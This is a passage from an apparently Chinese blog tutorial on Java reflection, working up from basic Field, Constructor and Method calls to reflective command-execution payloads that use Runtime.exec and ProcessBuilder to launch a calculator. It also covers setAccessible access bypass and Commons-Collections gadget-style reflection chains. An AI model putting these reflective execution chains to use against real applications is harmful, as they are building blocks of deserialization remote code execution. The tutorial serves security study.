<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里新增测试字段 public a</span></span><br><span class="line"><span class="comment">//public String a;</span></span><br><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Field a = personClass.getField(<span class="string">"a"</span>);</span><br><span class="line"><span class="comment">//获取成员变量a的值</span></span><br><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Object value = a.get(p);</span><br><span class="line">System.out.println(value);<span class="comment">//null</span></span><br><span class="line"><span class="comment">//设置a的值</span></span><br><span class="line">a.set(p,<span class="string">"张三"</span>)；</span><br><span class="line">System.out.println(p);<span class="comment">//Person&#123;name='null',age=0,a='张三'&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这里新增测试字段private d</span></span><br><span class="line"><span class="comment">//private String d</span></span><br><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Field[] declaredFields = personClass.getDeclaredFields();</span><br><span class="line"><span class="comment">// 获取所有的成员变量，不考虑修饰符，这个方法超级暴力</span></span><br><span class="line"><span class="keyword">for</span> (Field declaredField : declaredFields) &#123;</span><br><span class="line">    <span class="comment">//由于都是private，什么都不输出</span></span><br><span class="line">    System.out.println(declaredField);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Person p = <span class="keyword">new</span> Person();</span><br><span class="line">Field d = personClass.getDeclaredField(<span class="string">"d"</span>);</span><br><span class="line"><span class="comment">//当访问private时，忽略访问权限符的安全检查</span></span><br><span class="line"><span class="comment">//暴力反射</span></span><br><span class="line">d.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object value= d.get(p);</span><br><span class="line">System.out.println(value);<span class="comment">//null,因为初始化，还没有设置值</span></span><br></pre></td></tr></table></figure>

<h2 id="获取Constructor"><a href="#获取Constructor" class="headerlink" title="获取Constructor"></a>获取Constructor</h2><blockquote>
<p>获取构造方法们：</p>
<p>Constructor&lt;?&gt;[] getConstructors()</p>
<p>Constructor<?> getConstructor(类 <?> … parameterTypes)</p>
<p>Constructor&lt;?&gt; getDeclaredConstructors()</p>
<p>Constructor<?> getDeclaredConstructor(类 <?> … parameterTypes)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Constructor constructor = personClass.getConstructor(String<span class="class">.<span class="keyword">class</span>,<span class="title">int</span>.<span class="title">class</span>)</span>;<span class="comment">//每一个构造方法的参数种类不一样，这一步是获取构造方法</span></span><br><span class="line">System.out.println(constructor);</span><br><span class="line"><span class="comment">//所以可以执行构造函数，进而创建对象，[构造器.newInstance]</span></span><br><span class="line">Object person = constructor.newInstance(<span class="string">"张三"</span>, <span class="number">23</span>);<span class="comment">//传递对应的参数值</span></span><br><span class="line">System.out.println(person);<span class="comment">//Person&#123;name=‘张三‘，age=’23‘&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"><span class="comment">//对于无参的构造方法，可以直接使用Class类对象的newInstance方法</span></span><br><span class="line">Object o = personClass.newInstance();</span><br><span class="line">System.out.println(o);</span><br></pre></td></tr></table></figure>

<h2 id="获取Methods"><a href="#获取Methods" class="headerlink" title="获取Methods"></a>获取Methods</h2><blockquote>
<p>获取成员方法们：</p>
<p>Method[]  getMethods()//获取所有【public】修饰的方法，父类Object的方法也能看到</p>
<p>Method getMethod(String name，类 &lt;?&gt; … parameterTypes)</p>
<p>Method[] getDeclaredMethods()//</p>
<p>Method getDeclaredMethod(String name，类 &lt;?&gt; … parameterTypes)</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line"><span class="comment">//获取制定名称的方法</span></span><br><span class="line">Method eat_Method = personClass.getMethod(<span class="string">"eat"</span>);</span><br><span class="line"><span class="comment">//进而执行方法,【invoke】，它需要一个真实的对象，以及方法的实际参数列表</span></span><br><span class="line">Person pp = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">//因为是空参方法，所以直接放进来一个对象就行</span></span><br><span class="line"><span class="comment">//执行方法，eat...</span></span><br><span class="line">eat_Method.invoke(pp);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Method eat_Method2 = personClass.getMethod(<span class="string">"eat"</span>,String<span class="class">.<span class="keyword">class</span>)</span>;<span class="comment">//eat方法重载，eat方法的需要传入的参数是String类型</span></span><br><span class="line">eat_Method2.invoke(pp,<span class="string">"jiaozi"</span>);<span class="comment">//吃饺子</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class personClass = Person<span class="class">.<span class="keyword">class</span></span>;</span><br><span class="line">Method[] methods = personClass.getMethods();<span class="comment">//获取所有public方法名</span></span><br><span class="line"><span class="comment">//获取类名</span></span><br><span class="line">String className = personClass.getName;<span class="comment">//获取类名</span></span><br><span class="line">System.out.println(className);<span class="comment">//包名.类名</span></span><br><span class="line"><span class="keyword">for</span> (Method method : methods) &#123;</span><br><span class="line">    <span class="comment">//也支持暴力反射：method.setAccessible(true);</span></span><br><span class="line">    System.out.println(method);</span><br><span class="line">    <span class="comment">//获取所有方法名</span></span><br><span class="line">    String methodname = method.getName();</span><br><span class="line">    System.out.println(methodname);</span><br></pre></td></tr></table></figure>

<h1 id="灵魂体现"><a href="#灵魂体现" class="headerlink" title="灵魂体现"></a>灵魂体现</h1><p>这里引入一个实际利用中的小demo：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(className);    </span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里分步解读：</p>
<ol>
<li>首先两个参数：<code>className</code>、<code>methodName</code>分别代表了传入的类名和方法名。</li>
<li>首先<code>Class clazz = Class.forName(className);</code>这里的意思是在字节码层面，我先获取你的Class类对象，也就是<code>clazz</code></li>
<li>接下来<code>clazz.getMethod(methodName).invoke(clazz.newInstance());</code>这里的含义可以分步解读：<ol>
<li><code>clazz.getMethod(methodName)</code>这里我先根据传进来的方法名<code>methodName</code>获取你的Method对象;</li>
<li>接下来<code>.invoke(clazz.newInstance())</code>这个含义是对于我获取的method方法对象，我要执行这个方法，那么问题来了，我如何才能执行这个方法呢？？？</li>
<li>这里我先<code>clazz.newInstance()</code>，这一手的含义是我要先生成一个指定类的对象，那么如何生成呢？之前我已经获取了Class类对象，那么就可以用这个类对象来生成这个类的实例化对象</li>
<li><code>clazz.newInstance()</code>这样就可以生成一个实例化对象了</li>
<li>那么有了类的实例化对象之后，直接放入invoke参数里面，就可以凭借我们之前的Method对象来执行这个特殊的<code>className</code>方法了!</li>
</ol>
</li>
</ol>
<p>说了这么多嗷，我分步拆开来写一下，会更清晰一些：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  		<span class="comment">//首先找到类对象</span></span><br><span class="line">  		Class clazz = Class.forName(className);</span><br><span class="line">  		<span class="comment">//根据类对象找到Method方法对象</span></span><br><span class="line">      Method mtd = clazz.getMethod(methodName);</span><br><span class="line">  		<span class="comment">//动态生成类实例化对象obj</span></span><br><span class="line">      Object obj = clazz.newInstance();</span><br><span class="line">  		<span class="comment">//调用类中方法mtd</span></span><br><span class="line">      mtd.invoke(obj); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>以下一步步使用反射机制实现<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code>这个语句</p>
<ul>
<li>getRuntime()：其实就是<strong>Runtime类获取对象</strong>的方式，等于new一个Runtime类。之所以封装成一个函数是为了不调用一次建立一个对象，只获取一个对象来执行操作。</li>
<li>exec()：调用exec函数</li>
<li>calc.exe：调用计算器程序</li>
</ul>
<h2 id="类的初始化"><a href="#类的初始化" class="headerlink" title="类的初始化"></a>类的初始化</h2><p>这里我再写一个小demo吧：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始块</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.printf(<span class="string">"Empty block initial %s\n"</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态初始块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.printf(<span class="string">"Static initial %s\n"</span>, TrainPrint<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">"Initial %s\n"</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先我写一个测试类，对于这个测试类，它有初始块，静态初始块，构造函数。</p>
<p>那么下面我来获取它的Class对象，想看看当这个<code>TrainPrint</code>测试类加载进内存之后，哪些部分执行了，好主意，说写就写：</p>
<p>首先<strong>类的初始化</strong>:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> domain.TrainPrint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">initTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        Class.forName(<span class="string">"domain.TrainPrint"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：<code>Static initial class domain.TrainPrint</code></p>
<p>这说明当类加载进了内存，只有<strong>静态初始块</strong>得到了执行。</p>
<p>那么<strong>类的实例化</strong>呢:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> domain.TrainPrint;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">initTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        TrainPrint test= <span class="keyword">new</span> TrainPrint();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Static initial class domain.TrainPrint</span><br><span class="line">Empty block initial class domain.TrainPrint</span><br><span class="line">Initial class domain.TrainPrint</span><br></pre></td></tr></table></figure>

<p>这也暴露了顺序：<code>静态初始块</code>-&gt;<code>初始块</code>-&gt;<code>构造函数</code></p>
<p>补充：</p>
<p>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code>-&gt;<code>父类初始块</code>-&gt;<code>父类构造函数</code>-&gt;<code>子类初始块</code>-&gt;<code>子类构造函数</code><br>具有父类的类的实例化：<code>父类静态初始块</code>-&gt;<code>子类静态初始块</code></p>
<p>以上对于类初始化的说明其实就是说，单独一个Class.forName()，在<strong>类静态初始块可控的情况</strong>下，可以执行恶意代码。</p>
<h2 id="调用内部类"><a href="#调用内部类" class="headerlink" title="调用内部类"></a>调用内部类</h2><p>Java的普通类 C1 中支持编写内部类 C2 ，而在编译的时候，会生成两个文件： <code>C1.class</code> 和 <code>C1$C2.class</code>，可以把他们看作两个无关的类。</p>
<p><code>Class.forName(&quot;C1$C2&quot;)</code>可以调用这个内部类。</p>
<p>我们可以通过<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>来获取类（java.lang.Runtime是Runtime类的完整路径）</p>
<h2 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h2><p>Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：<br><code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class)</code></p>
<h2 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h2><p>invoke方法位于Method类下，其的作用是传入参数，执行方法，<br><code>public Object invoke(Object obj, Object... args)</code><br>它的第一个参数是执行method的实例化对象：</p>
<ul>
<li>如果这个方法是一个普通方法，那么第一个参数是类对象</li>
<li>如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板），它接下来的参数才是需要传入的参数。</li>
</ul>
<p>由于我们的exec函数是一个普通方法，需要传入类对象，即<code>invoke(类对象，exec方法传入的参数)</code><br>之前说到Runtime的类对象不能通过newInstance()来获取对象（class.newInstance等于new class）,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。</p>
<p>获取类对象：</p>
<figure class="highlight plain"><figcaption><span>(由于getRuntime是一个静态方法，invoke传入Runtime类，进行调用)</span></figcaption><table><tr><td class="code"><pre><span class="line">`invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;))，&quot;calc.exe&quot;)`</span><br><span class="line"></span><br><span class="line">合并：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).</span><br><span class="line">                invoke(</span><br><span class="line">                        Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(</span><br><span class="line">                                Class.forName(&quot;java.lang.Runtime&quot;)),&quot;/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200411221213662.png" alt="image-20200411221213662"></p>
<p>再简化一下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "/Applications/Calculator.app/Contents/MacOS/Calculator");</span><br></pre></td></tr></table></figure>

<p>详细解读，这里是一个疯狂套娃的过程：</p>
<ol>
<li>首先我要找到类对象，clazz，不多说了</li>
<li>接下来我要告诉这个类对象我要执行的方法是<code>exec</code>，这个exec方法接受的参数类型是<code>String</code>类型，当然就是恶意命令字符串</li>
<li>那么我们的invoke函数需要的操作就是<code>invoke(类对象，exec方法等待接收的参数)</code>，那么问题来了：Runtime类不允许<code>newInstance()</code>来实例化对象！！！但是他允许通过<code>getRuntime</code>方法返回一个对象，那么我就用getRuntime方法来返回一个对象！</li>
<li>现在开始疯狂套娃！</li>
<li>首先既然你不允许instance，那么我就在那个类对象的位置“套”出来一个对象！思路其实就是既然我没办法给你在那个位置“放”上一个实例化对象，那么我就在你的位置上<strong>使用反射invoke执行<code>getRuntime</code>方法</strong>，不就可以了么！</li>
<li>那么就有了简化版代码！</li>
<li>这里仔细看，可以看到，其实<code>getRuntime</code>方法它也是一个无参构造方法！</li>
</ol>
<h2 id="指定的构造方法生成类的实例"><a href="#指定的构造方法生成类的实例" class="headerlink" title="指定的构造方法生成类的实例"></a>指定的构造方法生成类的实例</h2><p>继续举一个演化成反射机制的执行命令payload的例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; paramList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">paramList.add(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(paramList);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>

<p>可见，其构造函数是写入了一个字符串，不是无参构造方法，接下来我们会一步步进行转化。</p>
<p>ProcessBuilder有两个构造函数：</p>
<ul>
<li><code>public ProcessBuilder(List command)</code></li>
<li><code>public ProcessBuilder(String... command)</code>(此处，String<code>...</code>这种语法表示String参数数量是可变的，与String[]一样)</li>
</ul>
<p><code>getConsturctor()</code>函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，<code>getConsturctor(参数类型)</code></p>
<p>选定后我们可以通过<code>newInstance()</code>,并传入构造函数的参数执行构造函数，即<code>newInstance(传入的构造函数参数)</code>。</p>
<p>start函数不是一个静态函数,需要传入类的实例，所以这里可以继续使用反射：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">clazz.getMethod("start").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList("/Applications/Calculator.app/Contents/MacOS/Calculator")));</span><br></pre></td></tr></table></figure>

<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200411224713717.png" alt="image-20200411224713717"></p>
<p>这里还有一种方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//这个可以传入多个字符串</span></span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(<span class="string">"/Applications/Calculator.app/Contents/MacOS/Calculator"</span>);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>

<p>那么payload就这样写吧：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;)).start();</span><br></pre></td></tr></table></figure>

<p>但是实际上我们这样调用是会报错的，因为newInstance函数接受参数是一个<code>Object..</code>也就是Object数组，它会完美契合我们提供的String[]，剥去一层数组。</p>
<p>那就再套一层：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.ProcessBuilder"</span>); </span><br><span class="line">((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]&#123;&#123;"/Applications/Calculator.app/Contents/MacOS/Calculator"&#125;&#125;)).start();</span><br></pre></td></tr></table></figure>

<h2 id="执行私有方法"><a href="#执行私有方法" class="headerlink" title="执行私有方法"></a>执行私有方法</h2><p>以上都是方法或构造方法是public函数，但是如果是私有方法，该如何调用？<br>之前用的都是getMethod、getConstructor，接下来需要使用getDeclaredMethod、getDeclaredConstructor：</p>
<ul>
<li>getMethod等方法获取的是当前类中所有<strong>公共</strong>方法，包括从父类继承的方法</li>
<li>getDeclared等方法获取的是<strong>当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了</strong></li>
</ul>
<p>之前说到Runtime的构造方式是一个私有方法，从而不能直接调用，那么接下来我就来调用Runtime的构造方法来获取一个实例来执行计算器弹出：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">Constructor m = clazz.getDeclaredConstructor(); </span><br><span class="line">m.setAccessible(<span class="keyword">true</span>); <span class="comment">//暴力反射</span></span><br><span class="line">clazz.getMethod("exec", String.class).invoke(m.newInstance(), "/Applications/Calculator.app/Contents/MacOS/Calculator");</span><br></pre></td></tr></table></figure>

<p>在获取到私有方法后，通过<code>setAccessible(true)</code>可以打破私有方法访问限制，从而进行调用。</p>
<h1 id="从Commons-collections收获的一点反思"><a href="#从Commons-collections收获的一点反思" class="headerlink" title="从Commons-collections收获的一点反思"></a>从Commons-collections收获的一点反思</h1><p>对于正常的反射模板：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br></pre></td></tr></table></figure>

<p>但其实我们很容易忽略反射机制中调用的函数实际上可以在两个不同的class中调用，<strong>就像好比有一个函数可以在两个class中调用</strong>。</p>
<p>在Commons-Collections的环境中，我们是没法得到<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(...)</code>的，但是可以得到<code>Class.forName(&quot;java.lang.Class&quot;).getMethod(...)</code>。</p>
<p>可以理解为我们可以抓到<code>Runtime</code>的父类，那么就可以得到以下途径进行变形：</p>
<ul>
<li>用反射机制去调用反射机制中使用的函数getMethod</li>
<li>使用invoke传入的obj去指定getMethod的当前的调用环境（在实际代码执行中是this变量的区别）</li>
</ul>
<p>继续看一下Class类中getMethod方法的接口：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span><span class="comment">////&lt;?&gt;... 表示任意类型任意数量的Class数组</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> NoSuchMethodException, SecurityException </span>&#123;</span><br><span class="line">    checkMemberAccess(Member.PUBLIC, Reflection.getCallerClass(), <span class="keyword">true</span>);</span><br><span class="line">    Method method = getMethod0(name, parameterTypes, <span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchMethodException(getName() + <span class="string">"."</span> + name + argumentTypesToString(parameterTypes));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> method;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们传数组，来拿到<code>getmethod</code>这个方法不就行了么：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Method method1= Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">        .getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;);//根据getMethod方法接口进行封装</span><br></pre></td></tr></table></figure>

<p>以下套娃警告！</p>
<p>这里的Class类，它有所有方法，我们就是先拿到<code>getmethod</code>这个方法，这里是为什么呢？因为对于想用反射来调用方法其他类的方法，你必须会用到<code>getmethod</code>方法（忘了的向上翻模板），这里就相当于我先把梯子拿到！</p>
<p>那么有了<code>getmethod</code>方法之后，我需要一个obj对象来调用呀，这个obj其实就是<code>java.lang.Runtime</code>。之前也说了，这个对象很有脾气，需要执行这个类下面的<code>Runtime</code>方法，才能实例化一个<code>Runtime</code>对象。</p>
<p>结合上面刚刚获取的<code>getmethod</code>梯子方法，继续写吧：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下语句执行结果等同于Class.forName("java.lang.Runtime").getMethod(getRunime)</span></span><br><span class="line">method1.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//用于对比：以下语句等同于Class.forName("java.lang.Class").getMethod(getRunime)</span></span><br><span class="line"><span class="comment">//method1.invoke(Class.forName("java.lang.Class"),"getRuntime",new Class[0]);</span></span><br></pre></td></tr></table></figure>

<p>合起来就是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.正常的反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br><span class="line"><span class="comment">// 2.经过变形的反射调用，需要绕一圈</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">    .getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)//得到getMethod方法</span><br><span class="line">   .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//new Class[0]其实就是占位</span></span><br></pre></td></tr></table></figure>

<p><code>new Class[0]</code>其实就是占位，因为阅读源码能看到invoke方法参数规范，是硬性标准需要两个参数的，第二个是一个<code>Object</code>类的数组：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IllegalAccessException, IllegalArgumentException,</span></span><br><span class="line"><span class="function">       InvocationTargetException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!override) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!Reflection.quickCheckMemberAccess(clazz, modifiers)) &#123;</span><br><span class="line">            Class&lt;?&gt; caller = Reflection.getCallerClass();</span><br><span class="line">            checkAccess(caller, clazz, obj, modifiers);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    MethodAccessor ma = methodAccessor;             <span class="comment">// read volatile</span></span><br><span class="line">    <span class="keyword">if</span> (ma == <span class="keyword">null</span>) &#123;</span><br><span class="line">        ma = acquireMethodAccessor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ma.invoke(obj, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以现在我们只是以<code>Class.forName(&quot;java.lang.Class&quot;)</code>开头获取到了Runtime类下的getRuntime方法。还没有执行。</p>
<h2 id="神奇的invoke参数"><a href="#神奇的invoke参数" class="headerlink" title="神奇的invoke参数"></a>神奇的invoke参数</h2><p>自己写完总觉得invoke参数奇奇怪怪的，淦，研究一下。</p>
<p>invoke有一个非常神奇的特性，它不会那么严格地校验obj。回顾之前总结的invoke传参规则：</p>
<blockquote>
<p>它的第一个参数是执行method的对象obj：</p>
<ul>
<li>如果这个方法是一个普通方法，那么第一个参数是类对象</li>
<li>如果这个方法是一个静态方法，那么第一个参数是类<br>它接下来的参数才是需要传入的参数。</li>
</ul>
</blockquote>
<p>但是，<strong>传入的第一个参数其实不一定要是正确的类或者类对象!</strong></p>
<p>下面一个小例子：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//main函数</span></span><br><span class="line">Class.forName(<span class="string">"a"</span>).getMethod(<span class="string">"print"</span>).invoke(<span class="keyword">null</span>);</span><br><span class="line"><span class="comment">//内部类：</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按照规则，print函数是一个<strong>静态方法</strong>，实际上我们应该invoke传入一个a的类。但是以上代码的执行结果却是成功的：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200412135058766.png" alt="image-20200412135058766"></p>
<p>但是如果<code>print</code>方法不是静态防范时就会执行失败：</p>
<p><img src="../images/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/image-20200412135158822.png" alt="image-20200412135158822"></p>
<p>这是因为invoke函数null抛出报错的机制导致的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">* <span class="meta">@exception</span> NullPointerException      </span><br><span class="line">* <span class="keyword">if</span> the specified object is <span class="keyword">null</span> and the method is an instance method. <span class="comment">//obj为null，并且method是一个实例method</span></span><br><span class="line">*/</span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当method是一个普通函数时，传入obj不能为null，并且其类对象要与方法匹配；但是当method是一个静态函数时，就很随便了(可能是因为压根不会被用到吧)。</p>
<p>这里我迷茫了好久，知道我看到这样一句话才弄懂：</p>
<blockquote>
<p><strong>类实例</strong>是其他类的实例，<strong>类</strong>实际上是Class.class这个类的实例。<br>这边之前的疑问是，getMethod不是静态方法而invoke中传入的是类而不是类实例。<br>实际上因为getMethod本来就是class类中的方法，而<code>Class.forName(&quot;java.lang.Runtime&quot;)</code>获取到的class类的实例<br>我们调用getMethod传入的不是之前的模糊类的概念，而是class类的实例（类实例），所以这里是没毛病的调用class类下的非静态方法，传入class类实例。</p>
